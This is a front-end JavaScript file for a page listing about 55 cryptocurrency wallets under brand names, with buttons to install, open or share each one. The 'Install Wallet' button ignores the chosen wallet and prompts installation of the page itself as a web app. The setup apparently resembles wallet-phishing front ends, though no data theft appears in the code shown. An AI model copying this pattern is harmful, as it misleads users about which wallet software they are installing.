console.log("Wallets page loaded!");

// Final clean wallet list (no duplicates)
const wallets = [
  "Meta Mask", "Poloniex", "Trust", "Solflare", "WalletConnect", "Terra", "Bitpay",
  "Maiar", "MyKey", "Atwallet", "Authereum", "Bitfrost", "Coinbase1", "Coinomi",
  "Dcent", "Easypocket", "Ledger", "Coolwallet", "Cybavowallet", "Coin98",
  "Harmony", "PeakDefi", "Gridplus", "VIA", "Imtoken", "Infinito", "Infinity",
  "Kadachain", "Keplr", "Midas1", "Marixwallet", "Midas2", "Nash", "Onto",
  "Ownbit", "Pillar", "Rainbow", "Safepal", "Sollet", "Spark", "Spatium",
  "Tokenary", "Tokenpocket", "Tomo", "Torus", "Coinbase2", "XDC", "Walletio",
  "Walleth", "Zelcore", "Phantom", "Exodus", "Binance", "Bitget", "Other Wallets",
];

const container = document.getElementById("walletContainer");

// Generate cards
wallets.forEach((name) => {
  let imageName =
    name
      .toLowerCase()
      .replace(/\s+/g, "")
      .replace(/'/g, "")
      .replace(/\./g, "")
      .replace(/-/g, "")
      .replace(/\//g, "") + ".webp";

  // Special card
  if (name.toLowerCase().includes("other")) {
    container.innerHTML += `
      <div class="wallet-card">
        <p>${name}</p>
        <div class="icon-row">
          <div class="icon-btn download-btn" onclick="installWallet('${name}')">
              <img src="assets/icons/downloads.png">
              <span>Install Wallet</span>
          </div>
          <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
              <img src="assets/icons/rocket.png">
              <span>Open Wallet</span>
          </div>
          <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
              <img src="assets/icons/share.png">
              <span>Share</span>
          </div>
        </div>
      </div>
    `;
    return;
  }

  // Normal card
  container.innerHTML += `
    <div class="wallet-card">
      <img src="wallet-icons/${imageName}" alt="${name}">
      <p>${name}</p>

      <div class="icon-row">
        <div class="icon-btn download-btn" onclick="installWallet('${name}')">
            <img src="assets/icons/downloads.png">
            <span>Install Wallet</span>
        </div>

        <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
            <img src="assets/icons/rocket.png">
            <span>Open Wallet</span>
        </div>

        <div class="icon-btn share-btn" onclick="shareWallet('${name}')">
            <img src="assets/icons/share.png">
            <span>Share</span>
        </div>
      </div>
    </div>
  `;
});

// Open wallet
function openWallet(walletName) {
  window.location.href = `wallet-page.html?wallet=${walletName}`;
}

/* ---------------------------
   SHARE WALLET
----------------------------- */
function shareWallet(walletName) {
  if (navigator.share) {
    navigator.share({
      title: "Wallet",
      text: `Check this wallet: ${walletName}`,
      url: window.location.href,
    }).catch(() => {});
  } else {
    alert("Sharing is not supported.");
  }
}

/* ---------------------------
   PWA INSTALL LOGIC
----------------------------- */
let deferredPrompt = null;

// Capture install event
window.addEventListener("beforeinstallprompt", (e) => {
  e.preventDefault();
  deferredPrompt = e;
  console.log("Install event saved");
});

/* ---------------------------
   NEW INSTALL POPUP
----------------------------- */
function openInstallPopup() {
  document.getElementById("installPopup").style.display = "flex";
}

function closeInstallPopup() {
  document.getElementById("installPopup").style.display = "none";
}

// Install from popup
document.getElementById("confirmInstallBtn").onclick = async () => {
  if (deferredPrompt) {
    deferredPrompt.prompt();
    await deferredPrompt.userChoice;
    deferredPrompt = null;
    closeInstallPopup();
  } else {
    alert("Install prompt not ready.");
  }
};

/* ---------------------------
   MAIN LOGIC FOR INSTALL
----------------------------- */
function installWallet(walletName) {
  if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) {
    alert("Install only works on mobile.");
    return;
  }

  // Open NEW popup (not the old one)
  openInstallPopup();
}
